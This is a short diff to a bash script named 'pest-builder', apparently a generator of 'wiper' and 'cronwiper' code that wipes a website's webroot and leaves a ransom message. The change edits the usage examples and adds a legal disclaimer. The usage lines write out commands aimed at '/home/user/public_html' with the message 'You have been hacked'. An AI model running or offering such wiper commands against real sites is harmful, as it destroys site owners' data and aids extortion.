@@ -75,9 +75,14 @@ done
 
 usage_text="Usage:\n\tbash pest-builder wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds\n\n";
 usage_text+="Example:\n\tbash pest-builder wiper /home/user/public_html \"You have been hacked\" 300\n\n";
-usage_text+="\tbash pest-builder cronwiper /home/user/public_html \"You have been hacked\"\n\n";
+usage_text+="\tbash pest-builder cronwiper /home/user/public_html \"You have been hacked\" 300\n\n";
 
 if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
+
+    legal_disclaimer="\n[!] Legal Disclaimer: Using this piece of software to generate code for use against targets without prior mutual consent is illegal. I assume no liability and bear no responsibility for any misuse or damage caused by this program."
+    legal_disclaimer+="\n\n"
+
+    echo -e $legal_disclaimer
 
     if [[ "$#" != 4 ]]; then
         echo -e $usage_text
